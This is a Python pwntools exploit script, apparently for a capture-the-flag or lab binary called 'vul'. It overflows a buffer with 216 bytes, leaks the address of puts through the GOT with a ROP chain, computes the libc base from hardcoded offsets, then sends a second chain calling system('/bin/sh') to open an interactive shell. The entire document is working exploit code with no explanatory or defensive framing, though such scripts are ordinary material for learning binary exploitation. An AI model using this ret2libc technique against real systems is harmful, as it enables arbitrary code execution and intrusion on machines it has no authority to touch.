from pwn import *
import sys 
import struct

start =     0x0000000000401060
puts_plt =  0x0000000000401030
puts_got =  0x0000000000404018

pop_rdi =   0x000000000040120b
ret =       0x0000000000401016

payload = b'A'*216
payload +=  struct.pack('<Q',ret)
payload +=  struct.pack('<Q',pop_rdi)
payload +=  struct.pack('<Q',puts_got)
payload +=  struct.pack('<Q',puts_plt)
payload +=  struct.pack('<Q',start)

p = process('./vul')
print(payload)

temp = p.recvline("Enter message: \n")
print(temp)
p.sendline(payload)

leaked_puts = u64(p.recvline().strip().ljust(8,b'\00'))

print(hex(leaked_puts))

libc_puts = 0x75e10

libc_base_address = leaked_puts - libc_puts

ret = libc_base_address +  0x00000000000c85df
pop_rdi = libc_base_address + 0x0000000000027c3d
bin_sh = libc_base_address + 0x198882
system_function = libc_base_address + 0x0000000000049860
exit_function = libc_base_address + 0x000000000003f100


buf = b"A" * 216
buf += struct.pack('<Q', ret)
buf += struct.pack('<Q', pop_rdi) # pop rdi ; ret
buf += struct.pack('<Q', bin_sh) #/bin/sh
buf += struct.pack('<Q', system_function) # system()
buf += struct.pack('<Q', exit_function) # exit()

p.clean()
p.recvline()
p.sendline(buf)
print("Done with Payload")
p.interactive()

